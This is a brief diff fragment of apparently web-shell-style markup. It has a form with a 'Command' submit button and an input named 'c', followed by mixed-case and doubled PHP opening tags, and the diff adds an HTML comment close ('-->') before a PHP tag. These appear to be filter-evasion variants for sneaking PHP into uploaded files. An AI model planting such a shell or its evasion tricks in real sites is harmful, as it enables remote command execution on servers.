@@ -7,7 +7,7 @@
 <input type=”text” NAME=”c”/>
 <input name=”submit” type=submit value=”Command”>
 </FORM>
-<?php
+--><?php
 <?pHp
 <<?php
 <?<?php
